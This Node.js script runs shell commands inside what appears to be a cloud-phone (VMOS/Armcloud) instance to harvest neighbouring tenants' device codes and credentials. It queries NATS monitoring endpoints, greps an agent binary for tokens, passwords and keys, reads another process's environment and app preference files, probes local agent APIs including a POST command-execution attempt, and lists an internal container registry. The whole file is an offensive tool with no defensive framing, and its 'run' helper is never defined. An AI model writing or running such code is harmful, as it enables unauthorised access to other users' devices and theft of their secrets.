#!/usr/bin/env node
/**
 * Find neighbor device credentials/pad codes via:
 * 1. NATS monitoring (8222) — detailed connection dump with subs
 * 2. Registry catalog — full image list, each image = a device
 * 3. Armcloud agent binary — embedded keys/tokens/URLs
 * 4. rtcgesture process — NATS auth token extraction
 * 5. /proc/net — established connections reveal neighbor IPs + ports
 * 6. Try direct syncCmd with empty/generic padCode patterns
 */

const path = require('path');
const fs = require('fs');

const { AK, SK, HOST, SVC, CT, SHD, hmacSign, api } = require('../shared/vmos_api');
const PAD = 'ACP250923JS861KJ';
const R = { ts: new Date().toISOString(), probes: {} };

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  console.log('═'.repeat(70));
  console.log('  FIND NEIGHBOR CREDENTIALS & PAD CODES');
  console.log('═'.repeat(70));

  // ═══ 1. NATS MONITORING — get ALL connections with subscription topics ═══
  console.log('\n▶ 1. NATS MONITORING ENDPOINT');
  
  // connz with full details
  log('1a: NATS connz (full, 50 conns)...');
  const connz = await run('curl -s -m15 "http://192.168.200.51:8222/connz?limit=50&subs=1&sort=msgs_to" 2>/dev/null', 20);
  R.probes.nats_connz = connz;
  
  // Extract pad codes from subscription topics
  const allPadMatches = connz.match(/ACP\w{10,}/g) || [];
  const uniquePads = [...new Set(allPadMatches)].filter(p => p !== PAD && p !== 'ACP251008GUOEEHB');
  log(`  Pad codes in NATS: ${uniquePads.length}`);
  for (const p of uniquePads) log(`    ${p}`);
  
  // Parse JSON if possible
  try {
    const j = JSON.parse(connz);
    log(`  Total connections: ${j.num_connections}`);
    for (const c of (j.connections || []).slice(0, 5)) {
      log(`  Client: ip=${c.ip} name=${c.name||'?'} subs=${c.num_subs} in=${c.in_msgs} out=${c.out_msgs}`);
      if (c.subscriptions_list) {
        for (const sub of c.subscriptions_list.slice(0, 3)) log(`    SUB: ${sub}`);
      }
    }
  } catch (e) { log(`  (not JSON) first 300 chars: ${connz.slice(0, 300)}`); }

  // subsz
  log('1b: NATS subsz...');
  const subsz = await run('curl -s -m10 "http://192.168.200.51:8222/subsz?subs=1" 2>/dev/null', 15);
  R.probes.nats_subsz = subsz;
  log(`  ${subsz.slice(0, 200)}`);
  
  // varz
  log('1c: NATS varz (server stats)...');
  const varz = await run('curl -s -m10 "http://192.168.200.51:8222/varz" 2>/dev/null', 15);
  R.probes.nats_varz = varz;
  try {
    const j = JSON.parse(varz);
    log(`  Connections: ${j.connections}, Total: ${j.total_connections}, Subs: ${j.subscriptions}`);
    log(`  Auth: ${j.auth_required}, TLS: ${j.tls_required}`);
  } catch (e) { log(`  ${varz.slice(0, 200)}`); }

  // ═══ 2. ARMCLOUD AGENT — extract embedded tokens/config ═══════
  console.log('\n▶ 2. ARMCLOUD AGENT CONFIG EXTRACTION');
  
  // Find the agent binary
  log('2a: Agent binary location + strings...');
  const agentBin = await run([
    'ls -la /proc/413/exe 2>/dev/null',
    'readlink /proc/413/exe 2>/dev/null',
    'echo "=== STRINGS ==="',
    'strings /proc/413/exe 2>/dev/null | grep -iE "(nats|token|auth|password|secret|key|api.?key|ak=|sk=|credential)" | sort -u | head -30',
  ].join('\n'), 20);
  R.probes.agent_bin = agentBin;
  for (const l of agentBin.split('\n')) { if (l.trim()) log(`  ${l.slice(0, 100)}`); }

  // Agent config files
  log('2b: Agent config/data files...');
  const agentFiles = await run([
    'find / -path /proc -prune -o -path /sys -prune -o \\( -name "*.conf" -o -name "*.cfg" -o -name "*.toml" -o -name "*.yaml" -o -name "*.yml" \\) -print 2>/dev/null | head -20',
    'echo "=== M CONFIG ==="',
    'cat /data/local/tmp/*.conf 2>/dev/null | head -20',
    'cat /system/etc/*.conf 2>/dev/null | head -20',
  ].join('\n'), 20);
  R.probes.agent_files = agentFiles;
  for (const l of agentFiles.split('\n').slice(0, 10)) { if (l.trim()) log(`  ${l}`); }

  // Agent HTTP API with different methods and content types
  log('2c: Agent API deeper probe...');
  const agentDeep = await run([
    'echo "=== GET / ==="',
    'curl -s -m5 http://127.0.0.1:8779/ 2>/dev/null',
    'echo ""',
    'echo "=== GET /api/v1/device ==="',
    'curl -s -m5 http://127.0.0.1:8779/api/v1/device 2>/dev/null',
    'echo ""',
    'echo "=== GET /api/v1/info ==="',
    'curl -s -m5 http://127.0.0.1:8779/api/v1/info 2>/dev/null',
    'echo ""',
    'echo "=== POST /api/v1/cmd ==="',
    'curl -s -m5 -X POST -d \'{"cmd":"id"}\' http://127.0.0.1:8779/api/v1/cmd 2>/dev/null',
    'echo ""',
    'echo "=== GET /api/pad ==="',
    'curl -s -m5 http://127.0.0.1:8779/api/pad 2>/dev/null',
  ].join('\n'), 20);
  R.probes.agent_deep = agentDeep;
  for (const l of agentDeep.split('\n')) { if (l.trim()) log(`  ${l.slice(0, 100)}`); }

  // ═══ 3. RTCGESTURE — NATS auth token from process ═════════════
  console.log('\n▶ 3. RTCGESTURE NATS AUTH TOKEN');
  
  log('3a: rtcgesture memory strings for NATS token...');
  const rtcStrings = await run([
    'strings /proc/997/maps 2>/dev/null | head -5',
    'echo "=== MAPS ==="',
    'cat /proc/997/maps 2>/dev/null | grep -E "(heap|stack|anon)" | head -10',
    'echo "=== NATS FROM FD ==="',
    'cat /proc/997/net/tcp 2>/dev/null | head -10',
    'echo "=== ENV ==="',
    'cat /proc/997/environ 2>/dev/null | tr "\\0" "\\n"',
  ].join('\n'), 20);
  R.probes.rtc_strings = rtcStrings;
  for (const l of rtcStrings.split('\n').slice(0, 15)) { if (l.trim()) log(`  ${l.slice(0, 100)}`); }

  // rtcgesture shared_prefs and databases
  log('3b: rtcgesture app data...');
  const rtcData = await run([
    'ls -laR /data/data/com.armcloud.rtcgesture/ 2>/dev/null | head -30',
    'echo "=== SHARED PREFS ==="',
    'cat /data/data/com.armcloud.rtcgesture/shared_prefs/*.xml 2>/dev/null',
    'echo "=== FILES ==="',
    'cat /data/data/com.armcloud.rtcgesture/files/* 2>/dev/null | head -20',
    'echo "=== DATABASES ==="',
    'ls /data/data/com.armcloud.rtcgesture/databases/ 2>/dev/null',
  ].join('\n'), 20);
  R.probes.rtc_data = rtcData;
  for (const l of rtcData.split('\n').slice(0, 20)) { if (l.trim()) log(`  ${l.slice(0, 100)}`); }

  // ═══ 4. REGISTRY — Proper catalog with image details ══════════
  console.log('\n▶ 4. REGISTRY CATALOG (detailed)');
  
  log('4a: v2 catalog...');
  const catalog = await run('curl -v -s -m15 "http://192.168.50.11/v2/_catalog?n=50" 2>&1 | tail -30', 20);
  R.probes.registry_v2 = catalog;
  for (const l of catalog.split('\n').slice(0, 15)) { if (l.trim()) log(`  ${l.slice(0, 100)}`); }

  log('4b: Our image tags...');
  const ourTags = await run('curl -s -m10 "http://192.168.50.11/v2/armcloud-proxy/armcloud/img-26032515425/tags/list" 2>/dev/null', 15);
  R.probes.our_tags = ourTags;
  log(`  ${ourTags.slice(0, 200)}`);

  // ═══ 5. NETWORK CONNECTIONS — what IPs does armcloud agent talk to ═══
  console.log('\n▶ 5. NETWORK INTEL');
  
  log('5a: All established connections...');
  const netConns = await run('ss -tnp 2>/dev/null', 15);
  R.probes.net_conns = netConns;
  for (const l of netConns.split('\n').slice(0, 15)) { if (l.trim()) log(`  ${l.slice(0, 100)}`); }

  log('5b: DNS cache / resolv...');
  const dns = await run('cat /etc/resolv.conf 2>/dev/null; echo "==="; cat /etc/hosts 2>/dev/null', 10);
  R.probes.dns = dns;
  for (const l of dns.split('\n').slice(0, 10)) log(`  ${l}`);

  // ═══ SAVE ═════════════════════════════════════════════════════
  const rf = `${path.join(__dirname, '..', 'reports')}/FIND_CREDS_${Date.now()}.json`;
  fs.writeFileSync(rf, JSON.stringify(R, null, 2));

  console.log('\n' + '═'.repeat(70));
  console.log('  FINDINGS');
  console.log('═'.repeat(70));
  console.log(`  Neighbor PAD codes from NATS: ${uniquePads.length}`);
  for (const p of uniquePads) console.log(`    ${p}`);
  console.log(`  Report: ${rf}`);
  console.log('═'.repeat(70));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
